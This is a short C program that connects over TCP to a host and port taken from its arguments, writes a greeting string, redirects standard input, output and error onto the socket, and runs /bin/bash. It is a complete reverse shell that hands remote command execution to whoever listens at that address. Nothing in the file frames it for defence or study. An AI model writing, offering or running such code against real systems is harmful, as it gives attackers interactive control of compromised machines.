#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

int soc,rc;
struct sockaddr_in serv_addr;

int main(int argc, char **argv)
{
    if (argc != 3) {
        printf("Usage:\n  <%s> <host> <port>\n", argv[0]);
        exit(-1);
    }
	serv_addr.sin_family=AF_INET;
	serv_addr.sin_addr.s_addr=inet_addr(argv[1]);
	serv_addr.sin_port=htons(atoi(argv[2]));
	/* serv_addr.sin_addr.s_addr = INADDR_ANY; */
	//printf("%02x\n",inet_addr("127.0.0.1"));-->0x1000007f
    if ((soc=socket(AF_INET,SOCK_STREAM,0)) == -1 ){
        perror("Can't create socket!");
        return -1;
    }
	rc = connect(soc,(struct sockaddr*)&serv_addr,sizeof(struct sockaddr));
    if (rc == -1){
        perror("On connecting socket!");
        return -1;
    }
	write(soc,"heeee\n",7);
	dup2(soc,0);
	dup2(soc,1);
	dup2(soc,2);
	char * const args[]={"bash",NULL};
	execve("/bin/bash",args,0);
	return 0;
}
